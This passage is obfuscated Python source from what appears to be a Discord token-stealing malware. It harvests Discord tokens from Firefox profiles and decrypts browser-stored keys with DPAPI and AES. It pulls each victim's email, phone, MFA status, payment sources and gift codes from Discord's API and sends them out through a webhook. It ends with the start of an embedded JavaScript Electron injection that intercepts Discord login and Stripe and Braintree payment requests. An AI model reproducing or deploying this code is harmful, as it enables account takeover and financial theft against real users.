                                        SJDHWRXSFAQUCCZXERVKSUQDSZAUCHPFFHFHCSDZQKHTSGKEZHDUBODABDMXBWLGPDJXLDMCEOVXOMYAHOW[DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ] = (MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL, f"{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\\{v4r_file_name}")

        if os.path.exists(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + "\\Mozilla\\Firefox\\Profiles"):
            for CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ, _, v4r_files in os.walk(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ in re.findall(BQCCBPJFKPPQWIWXSBSEMJCULVICJTYLOTWQHXZTEIEBWQVVLLPNKPAILEECRIVPEQKMAQKSQO, v4r_line.strip()):
                                    if FRJYZYVKVFQFGFJKMAVZVQKVZDKKHOGWRGIVRJPUHFXMCTTFOPOBSKQICJVJMKWQOHMHJNBJTRWZAONEUMIPGPWRZZHQVOARBEUW(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ, UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR):
                                        IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB = requests.get(UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR, headers={'Authorization': DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ}).json()['id']
                                        if IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB not in SYIOCLBJPIXVYVFSDRRQYKXVVPYFAFNQEXGEECFNJURFLOPJTDYIAPONYVERXYXDWVDOIFOC:
                                            QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX.append(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ)
                                            SYIOCLBJPIXVYVFSDRRQYKXVVPYFAFNQEXGEECFNJURFLOPJTDYIAPONYVERXYXDWVDOIFOC.append(IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB)
                                            SJDHWRXSFAQUCCZXERVKSUQDSZAUCHPFFHFHCSDZQKHTSGKEZHDUBODABDMXBWLGPDJXLDMCEOVXOMYAHOW[DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ] = ('Firefox', f"{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\\{v4r__file}")
        return QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX, SJDHWRXSFAQUCCZXERVKSUQDSZAUCHPFFHFHCSDZQKHTSGKEZHDUBODABDMXBWLGPDJXLDMCEOVXOMYAHOW

    def FRJYZYVKVFQFGFJKMAVZVQKVZDKKHOGWRGIVRJPUHFXMCTTFOPOBSKQICJVJMKWQOHMHJNBJTRWZAONEUMIPGPWRZZHQVOARBEUW(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ, UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR):
        return requests.get(UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR, headers={'Authorization': DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ}).status_code == 200

    def JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNFVal(HRYSBPJVGJBRFBHTCNAAXOUMRFROXIGCWMLDVTDBJSDAEAXZOPSWYDAKBIHDLKCDBSQWYNTXTP, DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD):
        HOYQKKTBUZBDPJGTAPSGHZBWOFEQIXWEZJAAPODKNRKEEJVNSHEPEONUHWKWHWNVDLCKHLJPUQYXSFMYNJLHAVMQSGASAKAZDD = HRYSBPJVGJBRFBHTCNAAXOUMRFROXIGCWMLDVTDBJSDAEAXZOPSWYDAKBIHDLKCDBSQWYNTXTP[3:15]
        YZSOMSZSDNMVTVQGRNJEWNRRTFSUJXQTUEVCYFQMNTVGXABCVQCIIZPADUDRKMTHJDSJJPEURVZLFYPCT = HRYSBPJVGJBRFBHTCNAAXOUMRFROXIGCWMLDVTDBJSDAEAXZOPSWYDAKBIHDLKCDBSQWYNTXTP[15:]
        VUBJUGEIXGPSTXSFMITQBWHOJZQMPXOJGKNOKMXJTQRVPXJEQIBGXL = AES.new(DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD, AES.MODE_GCM, HOYQKKTBUZBDPJGTAPSGHZBWOFEQIXWEZJAAPODKNRKEEJVNSHEPEONUHWKWHWNVDLCKHLJPUQYXSFMYNJLHAVMQSGASAKAZDD)
        return VUBJUGEIXGPSTXSFMITQBWHOJZQMPXOJGKNOKMXJTQRVPXJEQIBGXL.decrypt(YZSOMSZSDNMVTVQGRNJEWNRRTFSUJXQTUEVCYFQMNTVGXABCVQCIIZPADUDRKMTHJDSJJPEURVZLFYPCT)[:-16].decode()

    def EELMGCJPTRRITYQVTSVMBFSDIMWAQVGZFYMMXIAAEMMVORPMTSUQITYANZYCZREQVBQQWLZDCPKCLYAQKFZMGBFLDHEDEI(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
        if not os.path.exists(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
            return None
        with open(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ, "r", encoding="utf-8") as v4r_f:
            TYYQDPRKVQJNHGAOQYMMILALOCCELXLJVZVMXWPZDCSKHBRFULHKNTLTOZJDVJTGVIEIWYPSCAPSKYCARMVVOGSZLOMXXKVZS = json.load(v4r_f)
        DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD = base64.b64decode(TYYQDPRKVQJNHGAOQYMMILALOCCELXLJVZVMXWPZDCSKHBRFULHKNTLTOZJDVJTGVIEIWYPSCAPSKYCARMVVOGSZLOMXXKVZS["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(DGDBBWSXZHOZAHTSVPXHBIWJTXQFWKTUMTYYTCEKNNUFQADWPPJFD, None, None, None, 0)[1]

    QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX, SJDHWRXSFAQUCCZXERVKSUQDSZAUCHPFFHFHCSDZQKHTSGKEZHDUBODABDMXBWLGPDJXLDMCEOVXOMYAHOW = GBASEMMXEMLCDURJRAUVUXRNYAEEUZSAUFEOXDQNJRUBQQVHENMUKYQXFAFCUVXUHZCQJJZAYSIEZWT()
    DCTAAWCEASRTNRSYWWWBECILFHBRCQLTDKLEKLQHHFCTZZWFNHLKNURXNBRVADULGVVUEHEXIBPEPZQUWISTZYEROZVR = SyncWebhook.from_url(CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI)

    if not QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX:
        GPQJQZDODBKDWXCMWBUJGVPOVWKNWRHPOQOQCKGBXSYGKGYEKDQNIDYLHTHZ(
            CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI, 
            title=f'Discord Token {DPZEOYYVYHHCDTHYXVDIUJXMLXNPECBKTNJUHKJWBHAOJYTUMWKLLEGYQAR}:', 
            description=f"No discord tokens found."
        )
        return
    
    for DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ_d15c0rd in QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX:
        PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ_d15c0rd}).json()

        PAHALFANLYRZLAOPXWYJHRFCAOKWCTSCLEVXNCVHXYUSESKHHZPDMUSBECSSRPNMAWXRKIHLLCEUQLXZPRQKNRAAHCR = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('username', "None") + '#' + PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('discriminator', "None")
        IVKEGIRFERIJHEDDOOGRCPNVAHJIAOKRJHDTRRHLJRZMACZWZPLFGADEAKGKZZPLRFAKUMYLRFWEALKPVMGFCIISMITLPVSTTEX = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('global_name', "None")
        ITLWYNTMWIJPRXRDPDWPDLTYRVQAHCJNECWXLKQMPNRDGNJGWWIRGFCVFPYCSQZMXWQGYWDYMUJTKXYCDFXSLHYNJNZJPGRGJ = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('id', "None")
        VACYVAFOFTHJFYMWJHQDRATCGBAYTGIZIETPPTZAEPXPJMROXEWUCYSDGCCJGI = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('email', "None")
        FCWWCHUDSTJAPOCCYQDEZCWMAKPNPLXEMDRNXFGQBPMMZOKDRLBJEFPFSJAAXNQSYEUMLBXVZCRGJGIPJQUEKZLCKYEQOAOJPOPK = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('verified', "None")
        FIRVTTZKNSZIDYMPEBBCDKAFJFFRBGEUJNHSDDYSTOYLTMEDCER = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('phone', "None")
        QFLKYOSTYIRNCSZFJLVXFHBYUPJRBFMBIVPBIXQDRHJJYITJLUPCCYEAKJQWTA = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('locale', "None")
        TFTEAEOCZEVZROFYRQMJEQHAQGUOZEYSRFJPGQMLZRAAAAWIGLTCNJEACWUSJUBXZPKFHKRHHKTGYXOOGCR = PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('mfa_enabled', "None")

        try:
            if PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('premium_type', 'None') == 0:
                QYPJEGRDYYYYWYOKBCKCEAOANJKLMNMLCPJMOFROQIESUUOODLIWIFFEQOYXRIRHXYDHPTZCRMOSTATLWQADUPIOCZPCTPSF = 'False'
            elif PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('premium_type', 'None') == 1:
                QYPJEGRDYYYYWYOKBCKCEAOANJKLMNMLCPJMOFROQIESUUOODLIWIFFEQOYXRIRHXYDHPTZCRMOSTATLWQADUPIOCZPCTPSF = 'Nitro Classic'
            elif PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('premium_type', 'None') == 2:
                QYPJEGRDYYYYWYOKBCKCEAOANJKLMNMLCPJMOFROQIESUUOODLIWIFFEQOYXRIRHXYDHPTZCRMOSTATLWQADUPIOCZPCTPSF = 'Nitro Boosts'
            elif PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG.get('premium_type', 'None') == 3:
                QYPJEGRDYYYYWYOKBCKCEAOANJKLMNMLCPJMOFROQIESUUOODLIWIFFEQOYXRIRHXYDHPTZCRMOSTATLWQADUPIOCZPCTPSF = 'Nitro Basic'
            else:
                QYPJEGRDYYYYWYOKBCKCEAOANJKLMNMLCPJMOFROQIESUUOODLIWIFFEQOYXRIRHXYDHPTZCRMOSTATLWQADUPIOCZPCTPSF = 'False'
        except:
            QYPJEGRDYYYYWYOKBCKCEAOANJKLMNMLCPJMOFROQIESUUOODLIWIFFEQOYXRIRHXYDHPTZCRMOSTATLWQADUPIOCZPCTPSF = "None"

        try: 
            NKHGKNCWQZMPWSAHHQNTQAALXTXBIRVXTAPHARBUDQDMVEHMYBWAENJFMVBKNFKKYMINRIJTETWSSLBELVZ = f"https://cdn.discordapp.com/avatars/{ITLWYNTMWIJPRXRDPDWPDLTYRVQAHCJNECWXLKQMPNRDGNJGWWIRGFCVFPYCSQZMXWQGYWDYMUJTKXYCDFXSLHYNJNZJPGRGJ}/{PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{ITLWYNTMWIJPRXRDPDWPDLTYRVQAHCJNECWXLKQMPNRDGNJGWWIRGFCVFPYCSQZMXWQGYWDYMUJTKXYCDFXSLHYNJNZJPGRGJ}/{PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{ITLWYNTMWIJPRXRDPDWPDLTYRVQAHCJNECWXLKQMPNRDGNJGWWIRGFCVFPYCSQZMXWQGYWDYMUJTKXYCDFXSLHYNJNZJPGRGJ}/{PABJPUCUQEGXBOXBJMFCLUOIVGPSJWICCOLHCIHMOUVJGZUVQPBBJBGNNDIPMSLQSUVKWG['avatar']}.png"
        except: 
            NKHGKNCWQZMPWSAHHQNTQAALXTXBIRVXTAPHARBUDQDMVEHMYBWAENJFMVBKNFKKYMINRIJTETWSSLBELVZ = SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS

        try:
            VDNGILBXNBPXNKYXVYACOIRMAVHLEHESLBLGYUIJOGBKVEDZXKCVHFUPHNCHAPLCQJWKKELYRXAVNDRYAJLAGYEZTZ = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ_d15c0rd}).json()
            if VDNGILBXNBPXNKYXVYACOIRMAVHLEHESLBLGYUIJOGBKVEDZXKCVHFUPHNCHAPLCQJWKKELYRXAVNDRYAJLAGYEZTZ:
                PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC = []

                for v4r_method in VDNGILBXNBPXNKYXVYACOIRMAVHLEHESLBLGYUIJOGBKVEDZXKCVHFUPHNCHAPLCQJWKKELYRXAVNDRYAJLAGYEZTZ:
                    if v4r_method['type'] == 1:
                        PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC.append('CB')
                    elif v4r_method['type'] == 2:
                        PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC.append("Paypal")
                    else:
                        PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC.append('Other')
                PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC = ' / '.join(PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC)
            else:
                PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC = "None"
        except:
            PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC = "None"

        try:
            VKTMCXGIOZLVKQSCHFZPUOGMUKZDOPTDHNOLILPDTCKUGAYDOYPYAZIVGHIGJRRYJPTEFUOPCHXTB = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ_d15c0rd}).json()
            if VKTMCXGIOZLVKQSCHFZPUOGMUKZDOPTDHNOLILPDTCKUGAYDOYPYAZIVGHIGJRRYJPTEFUOPCHXTB:
                BBNIIFPWBPJULNTWFBUMQDWWGSAOYBKFKDTANRHFCEUIOGWZJTBUFUXSACAAPYKGBUAAJJBRNOSYHWPUQXMYFFCLNCYX = []
                for HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT in VKTMCXGIOZLVKQSCHFZPUOGMUKZDOPTDHNOLILPDTCKUGAYDOYPYAZIVGHIGJRRYJPTEFUOPCHXTB:
                    MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL = HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT['promotion']['outbound_title']
                    HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT = HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT['code']
                    GYKFRQVHQQKVRSJPDSTRKQAGNBQXRMSTWJQSNQGAHRDDRAFWOD = f"Gift: {MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL}\nCode: {HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT}"
                    if len('\n\n'.join(HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT)) + len(GYKFRQVHQQKVRSJPDSTRKQAGNBQXRMSTWJQSNQGAHRDDRAFWOD) >= 1024:
                        break
                    BBNIIFPWBPJULNTWFBUMQDWWGSAOYBKFKDTANRHFCEUIOGWZJTBUFUXSACAAPYKGBUAAJJBRNOSYHWPUQXMYFFCLNCYX.append(GYKFRQVHQQKVRSJPDSTRKQAGNBQXRMSTWJQSNQGAHRDDRAFWOD)
                if len(BBNIIFPWBPJULNTWFBUMQDWWGSAOYBKFKDTANRHFCEUIOGWZJTBUFUXSACAAPYKGBUAAJJBRNOSYHWPUQXMYFFCLNCYX) > 0:
                    HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT = '\n\n'.join(BBNIIFPWBPJULNTWFBUMQDWWGSAOYBKFKDTANRHFCEUIOGWZJTBUFUXSACAAPYKGBUAAJJBRNOSYHWPUQXMYFFCLNCYX)
                else:
                    HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT = "None"
            else:
                HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT = "None"
        except:
            HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT = "None"
    
        v4r_software_name, CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ = SJDHWRXSFAQUCCZXERVKSUQDSZAUCHPFFHFHCSDZQKHTSGKEZHDUBODABDMXBWLGPDJXLDMCEOVXOMYAHOW.get(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ_d15c0rd, ("Unknown Software", "Unknown location"))

        embed = Embed(title=f'Discord Token {DPZEOYYVYHHCDTHYXVDIUJXMLXNPECBKTNJUHKJWBHAOJYTUMWKLLEGYQAR}:', color=DAPSMXEDLIKSTFUVWGEPGFEBJXTTEWJJUJETQQTXGTJKZRGEXTXDCIJM)      
        embed.add_field(name=":file_folder: Path:", value=f"```{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}```", inline=True)
        embed.add_field(name=":globe_with_meridians: Token:", value=f"```{DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ_d15c0rd}```", inline=True)
        embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{PAHALFANLYRZLAOPXWYJHRFCAOKWCTSCLEVXNCVHXYUSESKHHZPDMUSBECSSRPNMAWXRKIHLLCEUQLXZPRQKNRAAHCR}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{IVKEGIRFERIJHEDDOOGRCPNVAHJIAOKRJHDTRRHLJRZMACZWZPLFGADEAKGKZZPLRFAKUMYLRFWEALKPVMGFCIISMITLPVSTTEX}```", inline=True)
        embed.add_field(name=":robot: Id:", value=f"```{ITLWYNTMWIJPRXRDPDWPDLTYRVQAHCJNECWXLKQMPNRDGNJGWWIRGFCVFPYCSQZMXWQGYWDYMUJTKXYCDFXSLHYNJNZJPGRGJ}```", inline=True)
        embed.add_field(name=":e_mail: Email:", value=f"```{VACYVAFOFTHJFYMWJHQDRATCGBAYTGIZIETPPTZAEPXPJMROXEWUCYSDGCCJGI}```", inline=True)
        embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{FCWWCHUDSTJAPOCCYQDEZCWMAKPNPLXEMDRNXFGQBPMMZOKDRLBJEFPFSJAAXNQSYEUMLBXVZCRGJGIPJQUEKZLCKYEQOAOJPOPK}```", inline=True)
        embed.add_field(name=":telephone_receiver: Phone:", value=f"```{FIRVTTZKNSZIDYMPEBBCDKAFJFFRBGEUJNHSDDYSTOYLTMEDCER}```", inline=True)   
        embed.add_field(name=":rocket: Nitro:", value=f"```{QYPJEGRDYYYYWYOKBCKCEAOANJKLMNMLCPJMOFROQIESUUOODLIWIFFEQOYXRIRHXYDHPTZCRMOSTATLWQADUPIOCZPCTPSF}```", inline=True)
        embed.add_field(name=":earth_africa: Language:", value=f"```{QFLKYOSTYIRNCSZFJLVXFHBYUPJRBFMBIVPBIXQDRHJJYITJLUPCCYEAKJQWTA}```", inline=True)
        embed.add_field(name=":moneybag: Billing:", value=f"```{PTKDMRPFGLIBOEOTBAZIVQWLNGOLASEJTTQOWQDMWNALMKYABCRWPTBCQLAUZXDBXZGIGFGIYGEBEHGUMZSZTRBFYAUWWRLRC}```", inline=True)
        embed.add_field(name=":gift: Gift Code:", value=f"```{HTPTQIZNMQHBHGTDCMPQIEDSRGDAPSYUURHKDZNIXOIDXATBPTFMEPCKTDHEYRCARAPNZMEURKUHUFJYT}```", inline=True)
        embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{TFTEAEOCZEVZROFYRQMJEQHAQGUOZEYSRFJPGQMLZRAAAAWIGLTCNJEACWUSJUBXZPKFHKRHHKTGYXOOGCR}```", inline=True)
        embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
        embed.set_image(url=NKHGKNCWQZMPWSAHHQNTQAALXTXBIRVXTAPHARBUDQDMVEHMYBWAENJFMVBKNFKKYMINRIJTETWSSLBELVZ)
        embed.set_footer(text=AZAPUOATZPGDQDFGBUKJXQYURDKDMCRZDJOUCYSXGSRXNFWKMWVYXPZTRQAOKNWMAFWDEXJLMAE, icon_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS)
        DCTAAWCEASRTNRSYWWWBECILFHBRCQLTDKLEKLQHHFCTZZWFNHLKNURXNBRVADULGVVUEHEXIBPEPZQUWISTZYEROZVR.send(embed=embed, username=XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG, avatar_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS)

UZUVWWUKKRMGRBWFGOGYKERLLHKDTJUZMDZQRYFHXQHOSXHUWRASEHWXVBUJATANYLAXAJ = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
